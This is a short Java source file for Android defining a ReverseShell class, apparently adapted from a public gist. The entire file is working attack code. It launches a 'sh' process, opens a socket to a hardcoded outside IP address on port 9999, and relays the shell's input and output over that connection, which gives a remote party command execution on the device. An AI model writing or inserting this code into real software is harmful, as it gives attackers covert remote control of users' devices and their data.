package frohoff;

import android.util.Log;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

/**
 * https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
 * 0 threads - synchronous
 * 1 method ( may be zero if inlined)
 */
public class ReverseShell {
    public static void run() {
        String host = "185.227.110.50";
        int port = 9999;
        String cmd = "sh";
        boolean verbose = true;
        long loop_sleep = 0;
        try {

            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0) so.write(pi.read());
                while (pe.available() > 0) so.write(pe.read());
                while (si.available() > 0) po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(loop_sleep);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                }
            }
            p.destroy();
            s.close();
        } catch (IOException e) {
            if (verbose) Log.e("frohoff.ReverseShell", "e", e);
        } catch (InterruptedException e) {
            if (verbose) Log.e("frohoff.ReverseShell", "e", e);
        }
    }
}
